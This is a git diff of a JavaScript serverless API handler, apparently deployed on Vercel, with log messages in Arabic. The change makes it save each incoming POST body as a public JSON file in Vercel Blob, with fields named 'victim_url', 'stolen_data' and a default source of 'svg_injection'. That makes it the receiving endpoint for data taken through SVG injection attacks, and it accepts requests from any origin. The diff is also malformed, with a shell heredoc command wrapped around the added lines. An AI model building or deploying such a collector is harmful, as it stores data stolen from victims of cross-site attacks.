@@ -1,4 +1,7 @@
-let memoryStore = [];
+cat > api/api.js << 'EOF'
+import { put } from '@vercel/blob';
+
+let blobStoreInitialized = false;
 
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -16,15 +19,33 @@ export default async function handler(req, res) {
     try {
         const data = req.body;
         const id = Date.now().toString();
-        const record = { id, ...data, time: new Date().toISOString() };
-        memoryStore.push(record);
+        const fileName = `submissions/${id}.json`;
         
-        console.log('✅ تم حفظ البيانات:', id);
-        console.log('📊 البيانات المستلمة:', JSON.stringify(record, null, 2));
+        // استخدام access: 'public' مع Blob store عام
+        const blob = await put(fileName, JSON.stringify({
+            id: id,
+            source: data.source || 'svg_injection',
+            victim_url: data.victim_url,
+            stolen_data: data.stolen_data || data,
+            time: new Date().toISOString()
+        }), {
+            access: 'public',
+            addRandomSuffix: false,
+        });
         
-        return res.status(200).json({ success: true, id: id });
+        console.log('✅ تم حفظ البيانات نهائياً:', id);
+        console.log('📊 الرابط:', blob.url);
+        
+        return res.status(200).json({ 
+            success: true, 
+            id: id, 
+            url: blob.url,
+            message: 'Data stored permanently in Vercel Blob'
+        });
         
     } catch(error) {
+        console.error('❌ خطأ:', error);
         return res.status(500).json({ success: false, error: error.message });
     }
 }
+EOF
